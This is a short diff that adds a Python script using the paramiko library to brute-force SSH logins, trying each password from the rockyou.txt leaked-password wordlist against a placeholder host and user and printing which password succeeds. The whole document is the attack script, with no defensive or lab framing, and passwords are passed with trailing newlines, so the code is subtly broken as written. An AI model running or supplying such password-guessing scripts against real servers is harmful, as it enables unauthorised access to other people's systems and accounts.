@@ -1,0 +1,22 @@
+import paramiko
+
+# Open the rockyou.txt file and read the passwords
+with open('rockyou.txt', 'r') as f:
+    passwords = f.readlines()
+
+# Connect to the SSH server
+client = paramiko.SSHClient()
+client.load_system_host_keys()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+# Try each password in the list
+for password in passwords:
+    try:
+        client.connect('ssh.example.com', username='user', password=password)
+        print(f"Successfully logged in with password: {password}")
+        break
+    except Exception as e:
+        print(f"Login failed with password: {password}")
+
+# Close the connection
+client.close()
